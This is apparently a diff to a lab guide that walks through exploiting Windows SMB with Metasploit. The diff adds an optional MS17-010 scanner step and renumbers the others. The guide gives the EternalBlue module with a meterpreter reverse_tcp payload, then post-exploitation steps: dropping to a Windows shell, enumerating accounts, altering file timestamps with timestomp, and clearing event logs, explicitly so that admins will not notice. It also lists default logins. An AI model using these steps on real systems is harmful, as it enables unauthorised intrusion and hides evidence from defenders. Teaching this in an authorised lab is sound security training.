@@ -25,6 +25,7 @@ COMMONS COMMANDS TO KNOW:
   • cd        - Call Directory
   • ifconfig  - Displays local network information
   • shell     - Opens Windows CMD prompt
+  • TAB key   - Auto-fills commands if available
 
 DEFAULT LOGINS:
   • Kali: root/toor
@@ -83,7 +84,7 @@ Allow remote users...
   1. Click: Start > Control Panel > System
   2. Under the Remote tab check the Allow user to connect remotely to this computer checkbox, then click OK
 
-Change user logon...
+Change user logon...z
   1. Click: Start > Control Panel > User Accounts
   2. Click: Change the way users log on or off (if you haven't already)
   3. Uncheck the Use the Welcome screen checkbox
@@ -110,17 +111,26 @@ NOTE: Optional...you can scan for very detailed versions and o/s with:
 
 4. Open a new terminal and run metasploit...
   a. Type: msfconsole
-  b. Type: use exploit/windows/smb/ms17_10_eternalblue
-    i. Have you used the TAB key to autocomplete a command?
-  c. Type: set
-    i. Look at your options…also use the show options if you cannot find the RHOST
-  d. Type: set RHOST <target_ip>
-    i. Type set again or show options to see the changes
-  e. Type: set payload windows/x64/meterpreter/reverse_tcp
-    i. Without the payload this will not work!
-  f. Type: run or exploit
 
-5. Now wait for the process to finish...you should see the word WIN like so...
+5. This one is optional but good to know what is does...
+  a. Type: use auxiliary/scanner/smb/smb_ms17_010
+  b. Type: info
+  c. Type: set RHOST <target_ip>
+  d. Type: run or exploit
+    i. Take notes!
+
+6. Now for the fun part...
+  a. Type: use exploit/windows/smb/ms17_10_eternalblue
+    i. Have you used the TAB key to autocomplete a command?
+  b. Type: set
+    i. Look at your options...also use the show options if you cannot find the RHOST
+  c. Type: set RHOST <target_ip>
+    i. Type set again or show options to see the changes
+  d. Type: set payload windows/x64/meterpreter/reverse_tcp
+    i. Without the payload this will not work!
+  e. Type: run or exploit
+
+7. Wait for the process to finish...you should see the word WIN like so...
 
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
@@ -132,14 +142,14 @@ meterpreter >
 NOTE: You’re in meterpreter, a command shell connecting you to your target.
 ******************************************************************************
 
-1. In meterpreter, find out where you’re at this time...
+8. In meterpreter, find out where you’re at this time...
   a. Type: pwd
 
-2. Find some information about the target...
+9. Find some information about the target...
   a. Type: sysinfo
     i. Take notes
 
-3. Find out the user accounts and when they were last accessed...
+10. Find out the user accounts and when they were last accessed...
   a. Type: shell
 	 i. To go into the cmd prompt of Windows
   b. Type: net help
@@ -157,22 +167,22 @@ NOTE: If theres an error or nothing happens while in the shell then use CTRL+C t
 meterpreter...then you can go back in to shell if you need to
 ******************************************************************************
 
-4. In meterpreter, go to the My Files folder...
+11. In meterpreter, go to the My Files folder...
   a. Type: cd c:/user
   b. Type: pwd to find out the user's account named
   c. Type: the users account then continue to the Desktop and the Folder...
 	 i. Example: c:/user/%username%/Desktop/My Files
 	 ii. FYI...replace %username% with the actual account that is currently logged-in
 
-5. If you're in the folder now...
+12. If you're in the folder now...
   a. Type: timestomp text1.txt -v
 	 i. Now you can see the MACE
    ii. MACE = Modified, Accessed, Created, Entry Modified
 
-6. Change the time and date...
+13. Change the time and date...
   a. Type: timestomp text1.txt -m "06/06/2016 12:30:25"
 
-7. Check the date and time...
+14. Check the date and time...
   a. Type: timestomp text1.txt -v
 	 i. -a, -c, -e flags respectively
 	 ii. -z changes all at the same time
@@ -186,5 +196,5 @@ NOTE: Several things here...
   b. You cannot change the entire MACE as this will give you away to the admins
 ******************************************************************************
 
-8. I did not included it in this guide, but if you want to clear the Event Logs to hide your trace then use the
+15. I did not included it in this guide, but if you want to clear the Event Logs to hide your trace then use the
 Maintain Persistence to Windows XP to learn to how.
